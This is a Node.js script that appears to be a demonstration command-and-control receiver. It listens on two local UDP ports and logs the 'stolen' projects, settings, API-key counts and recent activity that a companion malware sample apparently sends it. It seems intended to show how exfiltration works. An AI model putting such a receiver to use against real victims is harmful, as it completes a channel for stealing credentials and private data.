#!/usr/bin/env node

const dgram = require('dgram');
const chalk = require('chalk').default || require('chalk');

const server = dgram.createSocket('udp4');

server.on('error', (err) => {
  console.log(`Server error:\n${err.stack}`);
  server.close();
});

server.on('message', (msg, rinfo) => {
  console.log(chalk.red(`📡 INTERCEPTED from ${rinfo.address}:${rinfo.port}`));
  console.log(chalk.yellow(`   Size: ${msg.length} bytes`));
  
  try {
    // Try to parse the stolen data
    const dataStr = msg.toString();
    if (dataStr.includes('TELEMETRY_')) {
      const jsonStart = dataStr.indexOf('{');
      if (jsonStart !== -1) {
        const jsonData = JSON.parse(dataStr.substring(jsonStart));
        
        if (jsonData.stolenData && jsonData.stolenData.length > 0) {
          console.log(chalk.red(`   🚨 STOLEN DATA DETECTED!`));
          jsonData.stolenData.forEach((item, i) => {
            console.log(chalk.yellow(`   [${i+1}] Source: ${item.source}`));
            
            if (item.data.projects) {
              console.log(chalk.magenta(`       Projects: ${item.data.projects.slice(0,2).join(', ')}...`));
            }
            if (item.data.settings) {
              console.log(chalk.cyan(`       Settings: ${Object.keys(item.data.settings).slice(0,3).join(', ')}...`));
            }
            if (item.data.credentials) {
              console.log(chalk.red(`       🔑 API Keys: ${item.data.credentials.length} found`));
            }
            if (item.data.recentActivity) {
              console.log(chalk.dim(`       Recent: ${item.data.recentActivity[0]?.substring(0,50)}...`));
            }
          });
        } else {
          console.log(chalk.dim(`   Data: ${dataStr.substring(0, 100)}...`));
        }
      }
    } else {
      console.log(chalk.dim(`   Data: ${dataStr.substring(0, 100)}...`));
    }
  } catch (e) {
    // Show preview if parsing fails
    const preview = msg.toString().substring(0, 100);
    console.log(chalk.dim(`   Data: ${preview}...`));
  }
  
  console.log('');
});

server.on('listening', () => {
  const address = server.address();
  console.log(chalk.green(`🎯 Demo C2 Server listening on ${address.address}:${address.port}`));
  console.log(chalk.dim('Waiting to intercept malicious traffic...\n'));
});

// Listen on both ports the malware tries to contact
server.bind(41234, '127.0.0.1');

// Also create second server for port 8443
const server2 = dgram.createSocket('udp4');
server2.on('message', (msg, rinfo) => {
  console.log(chalk.red(`📡 INTERCEPTED on backup C2 from ${rinfo.address}:${rinfo.port}`));
  console.log(chalk.yellow(`   Size: ${msg.length} bytes`));
  console.log('');
});
server2.bind(8443, '127.0.0.1');